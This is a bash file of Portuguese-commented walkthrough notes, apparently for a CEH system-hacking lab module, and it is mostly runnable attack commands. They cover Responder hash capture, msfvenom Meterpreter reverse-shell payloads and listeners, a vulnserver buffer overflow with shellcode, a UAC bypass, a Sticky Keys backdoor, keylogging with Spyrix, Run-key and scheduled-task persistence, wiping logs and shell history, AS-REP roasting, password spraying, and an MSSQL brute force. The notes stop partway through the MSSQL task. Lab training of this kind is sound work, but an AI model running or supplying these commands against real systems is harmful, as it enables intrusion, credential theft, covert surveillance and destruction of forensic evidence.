#!/bin/bash


###############
# MOD 6 - Lab 1: Gain Access to the System
###############

########
# TASK 1: Perform Active Online Attack to Crack the System's Password using Responder
########

# Inicia o Responder escutando na interface de rede 'eth0'.
# Essa ferramenta captura requisições LLMNR/NBT-NS e responde com IP falso para coletar hashes NTLM.
sudo responder -I eth0

# (Opcional) Verifica o nome da interface de rede (ex: eth0, ens33, wlan0).
ifconfig

# No Windows 11, pressione Win + R e digite: \\CEH-Tools
# Isso forçará o sistema a tentar resolver um nome de rede, disparando requisição LLMNR/NBT-NS.
# O Responder irá capturar essa tentativa e coletar o hash NTLM.

# Os logs com os hashes capturados ficam armazenados neste diretório.
# Normalmente há arquivos .txt ou .json com os detalhes da requisição.
cd /usr/share/responder/logs/

# Eleva permissões para root antes de editar ou executar ferramentas como o John the Ripper.
sudo su

# Abre o editor gráfico Pluma para colar e salvar o hash capturado em um arquivo chamado 'hash.txt'.
pluma hash.txt

# Usa o John the Ripper para quebrar o hash NTLM e tentar revelar a senha em texto claro.
john hash.txt

# Dicas Importantes
#   Responder captura o hash NTLMv2 do usuário, não a senha diretamente.
#   A técnica só funciona se o Windows tiver LLMNR e NBT-NS ativados (o que é padrão em muitas redes internas).
#   O John the Ripper pode ser usado com wordlists (ex: --wordlist=/usr/share/wordlists/rockyou.txt) para tentativas mais complexas.


########
# TASK 2: Gain Access to a Remote System using Reverse Shell Generator
########

# Eleva permissões para root (Senha padrão: toor)
sudo su

# Executa o Reverse Shell Generator via Docker, expondo na porta 80
docker run -d -p 80:80 reverse_shell_generator

# (Se necessário) Libera a porta 80 caso esteja em uso pelo Apache
service apache2 stop

# [AÇÃO MANUAL]
# Acesse no navegador: http://localhost
# Isso abrirá a interface gráfica do Reverse Shell Generator

# [AÇÃO MANUAL]
# Na interface web, selecione:
# Payload: "Windows Meterpreter Staged Reverse TCP (x64)"
# IP: 10.10.1.13 | Porta: 4444

# [AÇÃO MANUAL]
# Copie o comando gerado do msfvenom, por exemplo:
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe > reverse.exe

# Executa o comando gerado para criar o payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe > reverse.exe

# [AÇÃO MANUAL]
# No Reverse Shell Generator, copie o código de listener com msfconsole
# Cole no terminal para iniciar o handler

# [AÇÃO MANUAL]
# Copie o arquivo reverse.exe para a pasta compartilhada com o Windows
# Exemplo: mover para /home/attacker/ceh-tools (acesso via SMB no Windows)

# [AÇÃO NO WINDOWS]
# Execute o arquivo reverse.exe no sistema Windows para iniciar a conexão reversa

# Dentro da sessão Meterpreter ativa, verifique o usuário comprometido
getuid

# [AÇÃO MANUAL]
# No HoaxShell, selecione "PowerShell IEX"
# Configure IP: 10.10.1.13 | Porta: 444
# Copie o código gerado

# Abre o editor gráfico Pluma e cola o código para criar o payload PowerShell
pluma shell.ps1

# [AÇÃO MANUAL]
# Transfira o shell.ps1 para a pasta compartilhada do Windows

# [NO WINDOWS | PowerShell]
# Acesse o diretório onde está o payload
cd C:\Users\Admin\Desktop\

# [NO WINDOWS | PowerShell]
# Execute o script reverso
.\shell.ps1

# No listener do HoaxShell, verifique o usuário conectado no sistema Windows
whoami

# Dicas Importantes
#   O uso de compartilhamento SMB é para fins didáticos; em ataques reais usa-se phishing, USB ou downloads falsos.
#   O listener só funciona se a vítima executar o payload (engenharia social costuma ser usada).
#   Não esqueça de configurar o mesmo IP e porta tanto no payload quanto no listener.


########
# TASK 3: Perform Buffer Overflow Attack to Gain Access to a Remote System
########

# Preparação do Ambiente (Windows 11)
#   Iniciar o vulnserver.exe como administrador
#   Abrir e anexar o vulnserver ao Immunity Debugger
#   Rodar o processo no debugger (ícone "Play")

# Conexão e Enumeração Inicial (Parrot Security)
nc -nv 10.10.1.11 9999 # Abre uma conexão com o vulnserver (porta 9999)
HELP # Descobre comandos válidos como TRUN, STATS, etc.
EXIT

# Teste de Vulnerabilidade com Spike Scripts (Fuzzing Direcionado)
pluma stats.spk
#   s_readline();
#   s_string("STATS ");
#   s_string_variable("0");
generic_send_tcp 10.10.1.11 9999 stats.spk 0 0 # Execuçã do Spike

pluma trun.spk
#   s_readline();
#   s_string("TRUN ");
#   s_string_variable("0");

# Fuzzing com Python (Exploração com Volume de Dados)
smb://10.10.1.11 # Acessar os scripts via SMB
#   Copiar a pasta Scripts para o Desktop
cd /home/attacker/Desktop/Scripts/
chmod +x fuzz.py
./fuzz.py 
#   Envia dados crescentes até crashar o vulnserver

# Descoberta do Offset com Pattern Create e Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 10400 # Gerar padrão
pluma findoff.py # Inserir no script Python
chmod +x findoff.py
./findoff.py # Executar

# Após crashar e ver o EIP sobrescrito no Immunity Debugger, descobrir offset
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 10400 -q 386F4337

# Verificar Controle do EIP
chmod +x overwrite.py
./overwrite.py # Envia buffer com bytes aleatórios
# No Immunity Debugger:
#   Verificar se o EIP foi sobrescrito

# Teste de Bad Characters
chmod +x badchars.py
./badchars.py # Envia todos os bytes possíveis
# No Immunity Debugger:
#   Clicar no registrador ESP
#   Clicar com o direito > "Follow in Dump"
#   Analisar os bytes na memória e identificar possíveis badchars
#   Confirmar se o \x00 é o único ruim, por exemplo

# Encontrar Módulo sem Proteção
#   Copiar mona.py para Immunity Debugger
E:\CEH-Tools\CEHv13 Module 06 System Hacking\Buffer Overflow Tools\Scripts\mona.py
C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands
# No Immunity Debugger:
!mona modules # Listar todos os módulos e suas proteções
#   Encontrar módulo sem DEP, ASLR ou SafeSEH (ex: essfunc.dll)

#  Localizar Endereço com JMP ESP
python3 /home/attacker/converter.py 
#   Digite: JMP ESP
#   Resultado: \xff\xe4
# No Immunity Debugger:
!mona find -s "\xff\xe4" -m essfunc.dll
#   Anotar o endereço (ex: 0x625011af)

# Inserir Breakpoint no JMP ESP
# No Immunity Debugger:
#   Clique no ícone de Go to address
#   Insira o endereço 625011af
#   Pressione F2 para criar breakpoint
#   Pressione F9 para continuar execução

# Controlar EIP com Endereço Válido
chmod +x jump.py
./jump.py
# No Immunity Debugger:
#   Verificar que o EIP agora contém 0x625011af (controle total sobre o fluxo de execução)

# Gerar Shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.13 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
#   Copiar o conteúdo gerado (em C-style array, ex: "b\x90\x90...")
#   Inserir esse conteúdo dentro do script shellcode.py
pluma shellcode.py
#   Cole o shellcode na variável correta (conversão com b"" em cada linha)

# Escutar com Netcat
sudo su
cd
nc -nvlp 4444

# Executar Payload Final
chmod +x shellcode.py
./shellcode.py
# Obter Shell
# No terminal com Netcat, verá uma conexão reversa iniciada
whoami


###############
# MOD 6 - Lab 2: Perform Privilege Escalation to Gain Higher Privileges
###############

########
# TASK 1: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
########

# Criação do Backdoor com msfvenom. Cria um executável malicioso com shell reversa usando o Meterpreter.
sudo su # Eleva ao root (senha: toor)
cd # Vai para o diretório raiz
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > /home/attacker/Desktop/Windows.exe

# Compartilhamento do Executável pelo Apache. Prepara diretório e inicia o servidor Apache para disponibilizar o arquivo ao Windows.
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
service apache2 start

# Configuração do Metasploit Listener (Handler). Prepara o Metasploit para escutar a conexão reversa do executável malicioso.
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.1.13
set LPORT 444
run

# Execução do Backdoor no Windows. Gera uma conexão reversa com sessão Meterpreter no Kali/Parrot.
# Acessar: 
http://10.10.1.13/share
# Baixar e executar: 
Windows.exe

# Verificação da Sessão do Meterpreter
sysinfo # Informações do sistema remoto
getuid # Mostra o usuário atual

# Bypass de UAC via FodHelper. Burlando o UAC para obter elevação de privilégio.
background # Coloca a sessão em segundo plano
search bypassuac # Procura exploits de Bypass de UAC
use exploit/windows/local/bypassuac_fodhelper
set session 1
set LHOST 10.10.1.13
set TARGET 0
exploit

# Escalada para NT AUTHORITY\SYSTEM
getsystem -t 1 # Tenta obter privilégios SYSTEM usando técnica 1
getuid # Verifica se conseguiu SYSTEM

# Exploração da Função Sticky Keys. Modifica o binário das Sticky Keys para abrir cmd.exe com privilégios SYSTEM.
background
use post/windows/manage/sticky_keys
sessions -i # Lista sessões ativas
set session 2 # Usa a sessão com privilégios
exploit

# Acesso via Sticky Keys no Lock Screen. Confirma que o terminal foi aberto com privilégios SYSTEM.
# Ações no Windows:
#   Fazer logout do Admin
#   Entrar como usuário Martin (senha: apple)
#   Na tela de bloqueio: pressionar Shift 5 vezes
#   Na janela do terminal aberta:
whoami

# Encerramento e Persistência
# Ações:
#   Deslogar de Martin
#   Logar como Admin
#   Reiniciar Parrot e Windows



###############
# MOD 6 - Lab 3: Maintain Remote Access and Hide Malicious Activities
###############

########
# TASK 1: User System Monitoring and Surveillance using Spyrix
########

# Monitoramento com Spyrix Personal Monitor
#   Keylogging (registro de teclas digitadas)
#   Captura de tela
#   Visualização ao vivo da tela e webcam
#   Monitoramento de sites visitados, programas abertos, etc.

# Passos Técnicos Importantes
# Acessar máquina Windows Server 2022
#   Ctrl + Alt + Del → login: CEH\Administrator / Pa$$w0rd
# Instalar Spyrix
#   Executar spm_setup.exe da pasta Z:\...
# Finalizar instalação com conta de monitoramento
#   Criar conta via navegador e registrar-se
# Copiar Spyrix para máquina-alvo
#   Ctrl+C no arquivo → Colar na área de trabalho via RDP
# Instalar Spyrix na máquina alvo (Windows Server 2019) via RDP
#   Executar .exe com email registrado
# Deletar o .exe do desktop (higiene pós-exploit)
#   Del
# Navegar com o usuário Jason
#   Abrir navegador e acessar sites
# Visualizar tudo via painel do Spyrix
#   Browser → Dashboard do Spyrix

# Persistência: Alteração de Chaves de Registro (Run Keys)
# Obs: Essa parte foi introduzida nos objetivos do lab, embora não detalhada no passo-a-passo, mas é comum em labs de persistência.
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run # Local Comum para Persistência
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v MaliciousProgram /t REG_SZ /d "C:\Windows\Temp\payload.exe" # Ação típica para manter acesso automático no boot

# Conexão Remota com RDP. Estabelecimento de sessão remota para instalar software malicioso no host.
# Abrir RDP
#   Menu Iniciar → "Remote Desktop Connection"
# Conectar
#   IP: 10.10.1.19
#   Usuário: Jason
#   Senha: qwerty

# Transferência de Arquivo para Máquina-Alvo
# Técnica clássica: copiar .exe via Área de Transferência no RDP.

# Ações de Monitoramento via Spyrix (Painel Web). Após a instalação, diversas funcionalidades ficam acessíveis pela interface web do Spyrix.
#   Summary:	            Visão geral de todas as atividades
#   Users activity:	        Abertura de apps, navegação, programas executados
#   Screenshots:	        Captura de tela periódica ou por evento
#   Web: pages visited	    Histórico de navegação
#   Keyboard events:	    Captura de tudo digitado (keylogger)
#   Event log:	            Eventos do sistema monitorado
#   Live viewing:	        Visualização ao vivo da tela
#   Request Smart Report:	Geração de relatório completo em .html

# Outras Técnicas Relacionadas a Manter Acesso (Mencionadas no Enunciado)
#   Agendamento de Tarefas. Persistência via Task Scheduler:
schtasks /create /tn "Backdoor" /tr "C:\Malware\backdoor.exe" /sc onlogon /ru SYSTEM
#   Rootkits e Ocultação de Arquivos. Para evitar detecção:
#       Instalação de rootkits em nível de kernel.
#       NTFS Alternate Data Streams:
type malware.exe > normal.txt:secretstream.exe
#   Esteganografia. Ocultar malwares dentro de imagens:
steghide embed -cf image.jpg -ef payload.exe

# Finalização e Higienização
# Sign-out do Jason
#   Logout para simular uso legítimo
# Reverter máquinas	Botão de energia
#   Revert Machine (ou End Lab e Relaunch)


########
# TASK 2: Maintain Persistence by Modifying Registry Run Keys
########

# Criar payloads com msfvenom
#   Shell reversa padrão
#   Test.exe → iniciar sessão Meterpreter temporária.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > /home/attacker/Desktop/Test.exe
#   Shell reversa para persistência (executada via chave do Registro)
#   registry.exe → manter acesso mesmo após reinicializações.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=4444 -f exe > /home/attacker/Desktop/registry.exe

# Preparar pasta compartilhada com Apache
#   Pasta /var/www/html/share servirá como servidor web para o Windows baixar os payloads.
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
cp /home/attacker/Desktop/*.exe /var/www/html/share/
service apache2 start

# Iniciar o Metasploit (para o Test.exe)
#   Prepara o listener do Metasploit para capturar a conexão do Test.exe.
msfconsole
#   Dentro do Metasploit:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.1.13
set lport 444
run

# Acesso via Windows 11
#   No navegador do Windows, acessar:
http://10.10.1.13/share
#   Baixar e executar:
#       Test.exe
#       registry.exe

# Elevar privilégios com BypassUAC
#   Isso ignora o UAC e eleva o Meterpreter para nível SYSTEM.
#   No Meterpreter:
getuid
background
#   Iniciar o módulo de bypass:
use exploit/windows/local/bypassuac_silentcleanup
set session 1
set LHOST 10.10.1.13
set TARGET 0
exploit
#   Após sucesso:
getsystem -t 1
getuid

# Modificar chave de registro Run
# No Meterpreter:
shell

# Comando para adicionar a execução persistente:
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
# "HKLM\Software\Microsoft\Windows\CurrentVersion\Run":	    Caminho da chave de inicialização automática
# "/v backdoor":	                                        Nome do valor criado no Registro
# "/t REG_EXPAND_SZ":	                                    Tipo de dado da chave (string expansível)
# "/d <caminho>":	                                        Caminho do executável malicioso

# Preparar outro handler para a persistência (4444)
msfconsole
#   Dentro do Metasploit:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.1.13
set lport 4444
exploit

# Reiniciar o Windows
#   Reiniciar o Windows 11
#   Ao reiniciar, a chave de Registro executa o registry.exe, que estabelece nova conexão reverse shell com o atacante.

# Resultado Final
#   Sessão Meterpreter com privilégios SYSTEM estabelecida automaticamente após reboot do alvo.
#   Persistência garantida até que o payload seja removido ou detectado.



###############
# MOD 6 - Lab 4: Clear Logs to Hide the Evidence of Compromise
###############

########
# TASK 1: Clear Windows Machine Logs using Various Utilities
########

# "wevtutil": Ferramenta nativa para listar, consultar e limpar logs individualmente
# "cipher /w:": Sobregrava espaço livre para impedir recuperação de arquivos deletados

# Executar script de limpeza automatizada de logs
E:\CEH-Tools\CEHv13 Module 06 System Hacking\Covering Tracks Tools\Clear_Event_Viewer_Logs.bat
# Ação:
#   Clique com o botão direito > "Executar como administrador"
#   O que esse .bat faz?
#       É um script em lote (.bat) que executa vários comandos wevtutil cl <log> para limpar:
#           Log de Aplicações
#           Log de Sistema
#           Log de Segurança
#           E outros logs padrão do Windows
wevtutil cl Application
wevtutil cl System
wevtutil cl Security

# Executar wevtutil manualmente via cmd
#   Abrir terminal como administrador:
#       Menu Iniciar > Digite “cmd” > Clique com o botão direito em “Prompt de Comando” > Executar como administrador
#   Listar todos os logs disponíveis:
wevtutil el         # Mostra todos os nomes dos logs existentes
wevtutil enum-logs  # Mostra todos os nomes dos logs existentes
#   Limpar log específico:
wevtutil cl System
wevtutil cl Application
wevtutil cl Security
#   Você pode limpar qualquer log listado com o el.

# Usar Cipher para sobregravar arquivos deletados
cipher /w:C:\
#   Substitua C:\ pelo local desejado: pode ser D:\, C:\Users\Admin\Downloads, etc.
#   O cipher /w: não deleta nada visível — ele sobregrava o espaço livre onde arquivos deletados existiam, para impedir a recuperação com ferramentas forenses.
#   Como funciona o processo?
#       Primeira passada: sobrescreve com 0x00
#       Segunda passada: sobrescreve com 0xFF
#       Terceira passada: sobrescreve com valores aleatórios
#   Importante:
#       Só funciona em partições NTFS
#       Leva tempo proporcional ao tamanho da unidade

# Dicas Finais para Cobrir Rastros (Beyond the Lab)
#   PowerShell (Clear-EventLog)	        Limpa logs via PowerShell
#   NTFS Alternate Data Streams	        Esconde arquivos em fluxos alternativos
#   Disable EventLog Service	        Desativa o serviço de logs temporariamente
#   Manipulação de Timestamps	        Usa ferramentas como timestomp para mascarar datas de criação/modificação
#   Sysinternals Tools	                Ferramentas como SDelete (para apagamento seguro de arquivos)


########
# TASK 2: Clear Linux Machine Logs using the BASH Shell
########

# Impede que novos comandos sejam armazenados no histórico
export HISTSIZE=0	
#   A variável HISTSIZE define quantos comandos o shell vai manter no histórico.
#   Ao definir HISTSIZE=0, o bash não armazena mais nenhum comando novo a partir daquele ponto.

# Limpa o histórico atual da sessão ativa do shell
history -c	
#   -c (clear): remove todos os comandos atualmente carregados na memória da sessão atual do Bash.
#   Isso não apaga imediatamente o conteúdo de ~/.bash_history, mas previne o salvamento no logout.

# Regrava o histórico da sessão atual (útil para sessões múltiplas)
history -w	
#   -w (write): grava o histórico da sessão atual no arquivo ~/.bash_history, sobrescrevendo o anterior.
#   Útil quando há múltiplas sessões Bash ativas, pois garante que o histórico atual seja o dominante.

# Destrói permanentemente o conteúdo do arquivo de histórico
shred ~/.bash_history	
#   "shred" sobrescreve o conteúdo do arquivo com dados aleatórios múltiplas vezes, tornando quase impossível a recuperação do conteúdo original, mesmo com ferramentas forenses.
#   É uma prática anti-forense muito eficaz.
#   "shred" é mais seguro que "rm" para apagar arquivos sensíveis

# Zera o conteúdo do arquivo após o uso (como segurança extra)
cat /dev/null > ~/.bash_history	
#   Sobrescreve o conteúdo do arquivo com nada (vazio).
#   É uma técnica complementar ao shred, como uma garantia a mais para evitar que restos de dados fiquem alocados no disco.

# Comando encadeado final. Executa todos os passos acima de uma vez e finaliza o terminal
shred ~/.bash_history && cat /dev/null > ~/.bash_history && history -c && exit

# Extras Avançados (para CTFs ou ambientes reais)
unset HISTFILE	                    # Remove o caminho do arquivo de histórico da sessão atual
ln -s /dev/null ~/.bash_history	    # Redireciona o histórico para o "vazio", tornando gravação impossível
auditctl -d	                        # Remove regras do auditd (para logs de sistema mais profundos)
journalctl --vacuum-time=1s	        # Remove logs do systemd (em distros modernas com journald)


###############
# MOD 6 - Lab 5: Perform Active Directory (AD) Attacks Using Various Tools
###############


########
# TASK 1: Perform Initial Scans to Obtain Domain Controller IP and Domain Name
########

# Objetivos, indentificar:
#   O IP do Controlador de Domínio (DC)
#   O nome do domínio AD
#   Os serviços ativos no DC
#   Essas informações serão base para ataques como AS-REP Roasting, Kerberoasting, spray de credenciais, entre outros.

# Tornar-se root
sudo su
#   Senha: toor

# Mover-se para o diretório raiz (opcional)
cd /

# Scan de toda a sub-rede para localizar o DC
nmap 10.10.1.0/24
#   Esse comando:
#       Varre todos os hosts do range 10.10.1.0 até 10.10.1.255.
#       Retorna IPs ativos e portas abertas (scan padrão TCP connect).
#   Saída esperada:
#       O IP 10.10.1.22 é identificado como Controlador de Domínio, porque possui:
#           porta 88/tcp aberta → serviço Kerberos
#           porta 389/tcp aberta → serviço LDAP
#   Essa é a primeira indicação de que o host roda serviços de AD.

# Varredura mais detalhada no DC (10.10.1.22)
nmap -A -sC -sV 10.10.1.22
#   Essa varredura coleta:
#     Nome do domínio AD: ex: CEH.com
#     Serviços ativos: Kerberos, LDAP, DNS, SMB, RPC, etc.
#     Informações de banner: identificações úteis para exploração
#   Resumo do que foi descoberto
#       IP do DC	            10.10.1.22
#       Nome do domínio AD	    CEH.com
#       Serviços ativos	        Kerberos (88), LDAP (389), SMB (445), DNS (53), etc

# Interpretação prática para o pentester
#   Essas informações são essenciais porque:
#       O IP do DC será o alvo principal de diversos ataques de AD.
#       O nome do domínio é necessário para ataques como:
#           AS-REP Roasting
#           Kerberoasting
#           Pass-the-Hash
#   Serviços como Kerberos (88/tcp) e LDAP (389/tcp) confirmam que este host é Domain Controller.


########
# TASK 2: Perform AS-REP Roasting Attack
########

# Interpretação Técnica
#   Contas sem pré-autenticação respondem com um TGT direto → atacante captura um hash RC4.
#   O hash é protegido pela senha do usuário → ataques offline com dicionários como rockyou.txt tornam viável a quebra.
#   Uma vez com a senha, o invasor pode acessar recursos da conta no domínio (movimentação lateral, exfiltração etc.).

# Medidas de Mitigação Reais:
#   Habilitar Pre-Authentication	    Garante que o KDC exija prova de identidade antes de enviar TGT
#   Políticas de senha fortes	        Reduzem a chance de sucesso por ataques de dicionário ou brute force
#   Monitoramento de logs	Detectar    requisições AS-REQ anômalas
#   Desabilitar contas antigas	    Contas não usadas devem ser removidas ou desabilitadas

# Objetivo:
#   Executar um ataque de AS-REP Roasting para capturar hashes Kerberos de contas sem pré-autenticação habilitada (DONT_REQ_PREAUTH).
#   Quebrar essas senhas offline usando ferramentas como John the Ripper.

# O que é AS-REP Roasting?
#   É um ataque contra contas no Active Directory que não exigem pré-autenticação Kerberos.
#   Nessas contas, um invasor pode solicitar diretamente um TGT (Ticket Granting Ticket).
#   o KDC (Domain Controller) responderá com um hash criptografado com a senha do usuário, que pode ser quebrado offline.

# Tornar-se root (administrador)
sudo su
#   Senha: toor

# Navegar até o diretório do script do Impacket
cd
cd impacket/examples/

# Rodar o ataque com GetNPUsers.py
python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
#   CEH.com/	                                Domínio alvo do Active Directory
#   -no-pass	                                Informa que não será fornecida senha (busca contas sem pré-autenticação)
#   -usersfile /root/ADtools/users.txt	        Lista de usuários a serem testados
#   -dc-ip 10.10.1.22	                        IP do Domain Controller (DC)

# Identificar contas vulneráveis
#   Exemplo de saída:
#       $krb5asrep$23$joshua@CEH.COM:3a3b4c7e3...
#   O script retorna um hash Kerberos AS-REP se a conta joshua estiver vulnerável (com DONT_REQ_PREAUTH ativado).

# Salvar o hash em um arquivo
echo '[HASH]' > joshuahash.txt
#   Substitua [HASH] pelo hash real retornado no passo anterior

# Quebrar o hash com John the Ripper
john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
#   O John compara o hash com a wordlist rockyou.txt, tentando encontrar a senha correspondente.
#   A senha da conta joshua foi quebrada com sucesso: cupcake


########
# TASK 3: Spray Cracked Password into Network using CrackMapExec.
########

# Interpretação Técnica
#   Senha fraca e reutilizada:          A senha cupcake era usada por mais de um usuário.
#   Escopo expandido:                   Ao descobrir uma senha com AS-REP Roasting, você testa contra outros usuários com alta taxa de sucesso.
#   Baixo risco de bloqueio:            Spraying usa uma senha por rodada, o que evita bloqueios de conta (ao contrário de brute force).
#   Pivoting:                           Com acesso a mark@10.10.1.40, o atacante pode escalar privilégios ou movimentar-se lateralmente na rede.

# Mitigações Reais
#   Bloquear contas após falhas:    Limite de tentativas com lockout temporário
#   MFA:                        	Multi-Factor Authentication mesmo em RDP
#   Monitorar logins:           	Detectar tentativas em massa vindas do mesmo IP
#   Política de senha forte:    	Reforça o uso de senhas únicas e difíceis de adivinhar
#   Limitar serviços RDP:       	Evitar exposição RDP desnecessária na rede

# Objetivo:
# Com apenas uma senha descoberta (via AS-REP Roasting), o atacante foi capaz de:
#   Sprayar toda a rede com CrackMapExec
#   Encontrar outro usuário reutilizando a senha
#   Estabelecer acesso RDP real com o Remmina

# O que é Password Spraying?
#   Password Spraying é uma técnica de ataque que testa uma única senha (comum) contra vários usuários, evitando bloqueios de conta por tentativas consecutivas com senhas erradas.
#   A senha cupcake, descoberta na Task 2 (AS-REP Roasting), será usada para testar múltiplos usuários.

# Tornar-se root
sudo su
#   Senha: toor

# Ir para o diretório base (opcional)
cd

# Realizar o Password Spray com CrackMapExec
cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
#   Parâmetros explicados:
#       cme rdp	                        Indica que será testado o serviço RDP
#       10.10.1.0/24	                Faixa de IPs da rede alvo (classe C: 256 endereços possíveis)
#       -u /root/ADtools/users.txt	    Lista de usuários a testar
#       -p "cupcake"	                Senha que será testada com todos os usuários listados
#   Objetivo:
#       Verificar quais usuários nessa rede estão usando a senha "cupcake" para autenticação RDP.

# Resultado da Execução
10.10.1.40:3389 - Valid credentials: CEH\mark:cupcake
#   Isso significa que o usuário mark na máquina 10.10.1.40 está usando a senha cupcake.

# Acesso RDP via Remmina (Cliente Gráfico)
#   Abrir o Remmina
#     Vá até o Menu do Parrot Security
#     Digite remmina
#     Clique em Remmina Remote Desktop Client
#   Conectar via RDP
#       No campo de IP/Hostname, insira:
#           10.10.1.40
#       Clique em Conectar
#       Quando for perguntado “Aceitar certificado?”, clique em Sim
#   Inserir as Credenciais
#     Username:	mark
#     Password:	cupcake
#     Clique em OK
#     A sessão RDP será iniciada e a área de trabalho da máquina-alvo será exibida.


########
# TASK 4: Perform Post-Enumeration using PowerView
########

# Objetivo:
#   Obter visibilidade total do ambiente AD pós-comprometimento (usuário Mark)
#   Mapear hosts e contas privilegiadas
#   Descobrir potenciais vetores de escalonamento lateral ou vertical
#   Preparar o caminho para ataques em SQL Server (Task seguinte)

# O que é o PowerView?
#   PowerView é um script em PowerShell criado para enumerar ambientes Active Directory com foco ofensivo.
#   Ele é parte do projeto PowerSploit e permite:
#       Listar usuários, computadores, grupos
#       Ver sessões ativas e logins simultâneos
#       Identificar relações de confiança entre domínios
#       Buscar SPNs para ataques de Kerberoasting
#       Enumerar OUs e permissões de objetos

# Acessar a pasta que contém o PowerView.ps1
cd /root/ADtools
#   Essa pasta contém o script PowerView.ps1, que será servido ao host Windows.

# Iniciar um servidor HTTP para compartilhar o script
python3 -m http.server
#   Isso inicia um servidor HTTP simples na porta 8000, tornando acessível o conteúdo da pasta atual via navegador.

# Dentro do RDP (Remmina): Baixar o PowerView.ps1
#   No navegador Firefox (dentro do Windows da VM Mark):
http://10.10.1.13:8000/PowerView.ps1
#   Certifique-se de que 10.10.1.13 seja o IP da sua máquina atacante Parrot.
#   O script será salvo na pasta Downloads do usuário Mark.

# Abrir o PowerShell no Windows
#   Procure por "PowerShell" no menu Iniciar e abra como usuário Mark.

# Permitir execução de scripts (Execution Policy)
powershell -EP Bypass
#   Essa flag ignora restrições de execução de scripts na sessão atual.

# Navegar até Downloads e carregar o PowerView.ps1
cd Downloads
. .\PowerView.ps1
#   O ponto (.) com espaço é usado para "dot source", carregando funções e variáveis do script no contexto atual.

# Enumerar computadores do domínio
Get-NetComputer
#   Objetivo: Identificar quais hosts estão no AD, possíveis alvos para exploração futura.

# Listar todos os grupos do domínio
Get-NetGroup
#   Objetivo: Encontrar grupos críticos como:
#       Domain Admins
#       Enterprise Admins
#       SQLService (ex: identificado SQL_srv)

# Listar todos os usuários do domínio
Get-NetUser
#   Objetivo: Verificar existência de contas privilegiadas e possíveis targets, como:
SQL_srv
#   Esse usuário chamou atenção por ser relacionado a serviços SQL e pode ter permissões elevadas.

# Outros Comandos Úteis do PowerView (Bônus)
Get-NetOU	                    # Lista todas as Organizational Units do domínio
Get-NetSession	                # Lista sessões de usuários ativas
Get-NetLoggedon	                # Verifica quem está logado em determinado host
Get-NetProcess	                # Lista processos ativos em máquinas do domínio
Get-NetService	                # Lista serviços em execução
Get-NetDomainTrust	            # Exibe relações de confiança entre domínios
Get-ObjectACL	                # Lista permissões de objetos (ACLs)
Find-InterestingDomainAcl	    # Filtra ACLs potencialmente perigosas (com controle total, etc.)
Get-NetSPN	                    # Lista SPNs do domínio (para ataques de Kerberoasting)
Invoke-ShareFinder	            # Descobre compartilhamentos acessíveis na rede
Invoke-UserHunter	            # Localiza onde admins estão logados (para pivoting)
Invoke-CheckLocalAdminAccess	# Verifica se o usuário atual tem permissão de administrador local

# Observação Importante
#   Antes de seguir para a próxima task, reinicie a máquina Parrot Security para:
#       Encerrar o servidor HTTP
#       Restaurar ambiente limpo
#       Evitar conflitos de porta/processo no próximo ataque


########
# TASK 5: Perform Attack on MSSQL service
########

# Objetivo:
#   Obter execução remota de comandos no servidor Windows Server 2019 via xp_cmdshell (procedimento armazenado no SQL Server).
#   Utilizar Hydra para brute force de senha MSSQL.
#   Confirmar se xp_cmdshell está habilitado.
#   Explorar via Metasploit para obter sessão com Meterpreter.

# Possíveis Próximas Ações
#   Elevação de privilégio local (se for necessário)
#   Movimento lateral via tokens ou sessões (com PowerView ou Mimikatz)
#   Persistência via criação de serviço agendado (task scheduler)
#   Exfiltração de arquivos sensíveis

# Ferramentas Utilizadas
#   Hydra	                    Ataque de força bruta ao login do serviço MSSQL
#   mssqlclient.py	            Cliente MSSQL via Impacket para execução de queries SQL
#   Metasploit (msfconsole)	    Exploração automática e geração de payloads remotos via xp_cmdshell
#   pluma	                    Editor de texto gráfico para salvar usuários

# Criar arquivo com nome de usuário
pluma user.txt
#   Escreva no arquivo:
SQL_srv
#   Este usuário foi encontrado durante enumeração com PowerView.

# Usar Hydra para força bruta de senha MSSQL
hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
#   Explicação:
#       -L user.txt	        Lista de usuários (neste caso, só "SQL_srv")
#       -P rockyou.txt	    Wordlist de senhas (rockyou)
#       10.10.1.30	        IP do alvo (Windows Server 2019)
#       mssql	            Módulo do protocolo MSSQL (porta 1433 padrão)
#   Senha descoberta: batman

# Conectar-se via mssqlclient.py (Impacket)
python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433
#   Explicação:
#   CEH.com/	        Domínio do AD
#   SQL_srv:batman	    Credenciais do usuário MSSQL
#   @10.10.1.30	        IP do servidor MSSQL
#   -port 1433	        Porta padrão do SQL Server

